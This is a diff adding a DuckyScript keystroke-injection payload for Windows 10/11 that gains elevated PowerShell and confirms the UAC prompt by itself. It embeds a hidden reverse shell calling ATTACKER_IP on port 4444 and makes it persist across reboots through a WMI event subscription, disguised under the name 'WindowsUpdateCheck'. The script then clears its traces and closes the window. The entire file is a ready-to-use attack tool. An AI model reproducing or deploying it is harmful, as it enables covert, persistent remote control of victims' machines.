@@ -1,0 +1,95 @@
+REM ==========================================
+REM Title: WMI Event Subscription Persistence
+REM Author: NullSec Suite
+REM Target: Windows 10/11
+REM Description: Creates a permanent WMI event
+REM   subscription for fileless persistence.
+REM   Uses __EventFilter, CommandLineEventConsumer
+REM   and __FilterToConsumerBinding to execute
+REM   payload on system events without touching
+REM   disk or common persistence locations.
+REM Category: Persistence / Defense Evasion
+REM ==========================================
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass'"
+ENTER
+DELAY 2000
+ALT y
+DELAY 1500
+REM Define the payload command (encoded reverse shell)
+STRING $cmd = 'powershell -W Hidden -NoProfile -Command "while($true){try{$c=New-Object Net.Sockets.TcpClient(''ATTACKER_IP'',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII.GetBytes($r)),0,$r.Length)}}catch{Start-Sleep 600}}"'
+ENTER
+DELAY 500
+REM Create WMI Event Filter (triggers 5 min after boot)
+STRING $filterName = 'WindowsUpdateCheck'
+ENTER
+DELAY 350
+STRING $query = "SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 300"
+ENTER
+DELAY 400
+STRING $filterParams = @{
+ENTER
+DELAY 300
+STRING   Name = $filterName
+ENTER
+DELAY 300
+STRING   EventNameSpace = 'root\cimv2'
+ENTER
+DELAY 300
+STRING   QueryLanguage = 'WQL'
+ENTER
+DELAY 300
+STRING   Query = $query
+ENTER
+DELAY 300
+STRING }
+ENTER
+DELAY 350
+STRING $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterParams
+ENTER
+DELAY 500
+REM Create WMI Event Consumer (CommandLine type)
+STRING $consumerParams = @{
+ENTER
+DELAY 300
+STRING   Name = $filterName
+ENTER
+DELAY 300
+STRING   CommandLineTemplate = $cmd
+ENTER
+DELAY 300
+STRING }
+ENTER
+DELAY 350
+STRING $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerParams
+ENTER
+DELAY 500
+REM Bind the filter to the consumer
+STRING $bindingParams = @{
+ENTER
+DELAY 300
+STRING   Filter = $filter
+ENTER
+DELAY 300
+STRING   Consumer = $consumer
+ENTER
+DELAY 300
+STRING }
+ENTER
+DELAY 350
+STRING Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingParams
+ENTER
+DELAY 500
+REM Verify WMI subscription is installed
+STRING Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name -eq $filterName } | Select Name
+ENTER
+DELAY 400
+STRING Write-Host 'WMI persistence installed successfully'
+ENTER
+DELAY 400
+STRING Clear-Host; exit
+ENTER
+DELAY 300
+ALT F4
